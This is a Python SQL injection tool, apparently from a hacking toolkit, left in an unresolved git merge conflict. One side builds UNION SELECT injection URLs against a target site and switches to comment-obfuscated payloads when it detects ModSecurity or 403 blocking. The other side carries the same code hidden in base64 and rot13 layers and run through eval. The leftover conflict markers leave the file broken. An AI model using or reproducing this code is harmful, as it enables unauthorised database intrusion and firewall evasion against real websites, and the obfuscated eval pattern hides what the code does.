# Coded by Cracker
# CRACKER911181
 

<<<<<<< HEAD
import requests
import sys

#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest

#######

print(blue+"\n\n[+]Checking and Bypassing Farewall & 403 Error\n"+yellow)
###### file open #######

clmn=open(".colomn.txt","r")
colmn=clmn.read()

url=open(".link.txt","r")
link=url.read()

smbl=open(".smbl.txt","r")
symbol=smbl.read()

####################

#####how much colomn#######

colomn=int(colmn)

unin=[ ]
now_clmn=1
for i in range(colomn):
	now_colomn=str(now_clmn)
	unin.append(now_colomn)
	
	now_clmn=now_clmn+1

uniion=(",".join(unin))
union=str(uniion)

#######################

smbl1=symbol[0]
smbl2=symbol[1:]

######################

union_opn=open(".union.txt","w")

######################

if smbl1=="'":
	real_link=str(link+smbl1+"+AND+0+UNION+SELECT+"+union+smbl2)
	
	
	resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
	
	if "Not Acceptable" in resp:
		real_link1=str(link+smbl1+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+smbl2)
		
		union_opn.write(real_link1)
		union_opn.close()
	
	elif "403" in resp:
		real_link2=str(link+smbl1+"+AND+0+/*!50000UNION*/+SELECT+"+union+smbl2)
		
		union_opn.write(real_link2)
		union_opn.close()
	
	else:
		
		
		union_opn.write(real_link)
		union_opn.close()


		
else:
	real_link=str(link+"+AND+0+UNION+SELECT+"+union+symbol)
	
	
	resp=requests.get(real_link,headers={"User-Agent": "XY"}).text
	
	if "Mod_Security" in resp:
		real_link1=str(link+"+AND+0+/*!50000UNION/**_**/*/+SELECT+"+union+symbol)
		
		union_opn.write(real_link1)
		union_opn.close()
	
	elif "403" in resp:
		real_link2=str(link+"+AND+0+/*!50000UNION*/+SELECT+"+union+symbol)
		
		union_opn.write(real_link2)
		union_opn.close()
	
	else:
		
		union_opn.write(real_link)
		union_opn.close()
=======
import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzeXMKCiNUZXh0IGNvbG91cgojY3JlYXRlZCBCeSBDcmFja2VyOTExMTgxCmNvbG91cm9mZj0iXHgxYlswMG0iICNjb2xvdXIgb2ZmCgpyZWQ9Ilx4MWJbOTFtIiAjcmVkCmdyZWVuPSJceDFiWzkybSIgI2dyZWVuCnllbGxvdz0iXHgxYls5M20iICN5ZWxsb3cKYmx1ZT0iXHgxYls5NG0iICNibHVlCnJvc3k9Ilx4MWJbOTVtIiAjcm9zeQpwZXN0PSJceDFiWzk2bSIgI3Blc3QKCiMjIyMjIyMKCnByaW50KGJsdWUrIlxuXG5bK11DaGVja2luZyBhbmQgQnlwYXNzaW5nIEZhcmV3YWxsICYgNDAzIEVycm9yXG4iK3llbGxvdykKIyMjIyMjIGZpbGUgb3BlbiAjIyMjIyMjCgpjbG1uPW9wZW4oIi5jb2xvbW4udHh0IiwiciIpCmNvbG1uPWNsbW4ucmVhZCgpCgp1cmw9b3BlbigiLmxpbmsudHh0IiwiciIpCmxpbms9dXJsLnJlYWQoKQoKc21ibD1vcGVuKCIuc21ibC50eHQiLCJyIikKc3ltYm9s'
love = 'CKAgLzjhpzIuMPtcPtbwVlZwVlZwVlZwVlZwVlZwVlZwVjbXVlZwVlAbo3ptoKIwnPOwo2kioJ4wVlZwVlZwPtcwo2kioJ49nJ50XTAioT1hXDbXqJ5cow1oVS0Xoz93K2AfoJ49ZDczo3VtnFOcovOlLJ5aMFuwo2kioJ4cBtbWoz93K2AioT9gow1mqUVboz93K2AfoJ4cPty1ozyhYzSjpTIhMPuho3qsL29fo21hXDbWPtyho3qsL2kgow1ho3qsL2kgovfkPtc1ozyco249XPVfVv5do2yhXUIhnJ4cXDc1ozyiow1mqUVbqJ5cnJ9hXDbXVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZXPaAgLzjkCKA5oJWioSfjKDcmoJWfZw1mrJ1vo2koZGcqPtbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwPtc1ozyioy9ipT49o3OyovtvYaIhnJ9hYaE4qPVfVapvXDbXVlZwVlZwVlZwVlZwVlZwVlZwVlZwVjbXnJLtp21voQR9CFVaVwbXPKWyLJksoTyhnm1mqUVboTyhnlgmoJWfZFfvX0SBEPfjX1IBFH9BX1ASGRIQIPfvX3IhnJ9hX3AgLzjlXDbWPtxXPKWy'
god = 'c3A9cmVxdWVzdHMuZ2V0KHJlYWxfbGluayxoZWFkZXJzPXsiVXNlci1BZ2VudCI6ICJYWSJ9KS50ZXh0CgkKCWlmICJOb3QgQWNjZXB0YWJsZSIgaW4gcmVzcDoKCQlyZWFsX2xpbmsxPXN0cihsaW5rK3NtYmwxKyIrQU5EKzArLyohNTAwMDBVTklPTi8qKl8qKi8qLytTRUxFQ1QrIit1bmlvbitzbWJsMikKCQkKCQl1bmlvbl9vcG4ud3JpdGUocmVhbF9saW5rMSkKCQl1bmlvbl9vcG4uY2xvc2UoKQoJCgllbGlmICI0MDMiIGluIHJlc3A6CgkJcmVhbF9saW5rMj1zdHIobGluaytzbWJsMSsiK0FORCswKy8qITUwMDAwVU5JT04qLytTRUxFQ1QrIit1bmlvbitzbWJsMikKCQkKCQl1bmlvbl9vcG4ud3JpdGUocmVhbF9saW5rMikKCQl1bmlvbl9vcG4uY2xvc2UoKQoJCgllbHNlOgoJCQoJCQoJCXVuaW9uX29wbi53cml0ZShyZWFsX2xpbmspCgkJdW5pb25fb3BuLmNsb3NlKCkKCgoJCQplbHNlOgoJcmVhbF9saW5rPXN0cihsaW5r'
destiny = 'XlVeDH5RXmNeIH5WG04eH0IZEHAHXlVeqJ5co24ep3ygLz9fXDbWPtxXPKWyp3N9pzIkqJImqUZhM2I0XUWyLJksoTyhnlkbMJSxMKWmCKfvIKAypv1OM2IhqPV6VPWLJFW9XF50MKu0PtxXPJyzVPWAo2EsH2IwqKWcqUxvVTyhVUWyp3N6PtxWpzIuoS9fnJ5eZG1mqUVboTyhnlfvX0SBEPfjXl8dVGHjZQNjIH5WG04iXvcsXvbiXv8eH0IZEHAHXlVeqJ5co24ep3ygLz9fXDbWPDbWPKIhnJ9hK29jov53pzy0MFulMJSfK2kcozfkXDbWPKIhnJ9hK29jov5woT9mMFtcPtxXPJIfnJLtVwDjZlVtnJ4tpzImpQbXPDylMJSfK2kcozflCKA0pvufnJ5eXlVeDH5RXmNeYlbuAGNjZQOIGxyCGvbiX1ASGRIQIPfvX3IhnJ9hX3A5oJWioPxXPDxXPDy1ozyioy9ipT4hq3WcqTHbpzIuoS9fnJ5eZvxXPDy1ozyioy9ipT4hL2kip2HbXDbWPtyyoUAyBtbWPDbWPKIhnJ9hK29jov53pzy0MFulMJSfK2kcozfcPtxWqJ5co25so3OhYzAfo3AyXPx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
>>>>>>> 92deafb008d1bb650e2a2df0d133f097b979d969
